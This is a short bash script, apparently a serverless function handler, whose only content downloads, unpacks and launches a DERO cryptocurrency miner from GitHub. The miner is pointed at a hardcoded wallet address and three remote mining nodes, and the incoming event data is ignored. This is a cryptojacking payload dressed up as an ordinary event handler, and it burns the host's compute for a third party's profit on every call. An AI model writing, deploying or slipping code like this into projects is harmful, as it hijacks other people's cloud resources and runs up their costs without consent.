function handler () {
    EVENT_DATA=$1
cd /tmp &&
curl -L https://github.com/dero-am/astrobwt-miner/releases/download/V1.7-BETA1/astrominer-V1.7_BETA1_modern_amd64_linux.tar.gz -o /tmp/astrominer-V1.7_BETA1_modern_amd64_linux.tar.gz &&
tar -xf astrominer-V1.7_BETA1_modern_amd64_linux.tar.gz &&
chmod 777 astrominer &&
./astrominer -w dero1qy8suqefcs4hxwz93eq39uuggj9du7gh2vfr8jgv0wscae05255zxqgcnrcfd -r dero-node-yashnik-eu.mysrv.cloud:10100 -r1 dero-node-overlode.mysrv.cloud:10100 -r2 dero-node-ch4k1pu.mysrv.cloud:10100 -p rpc
}
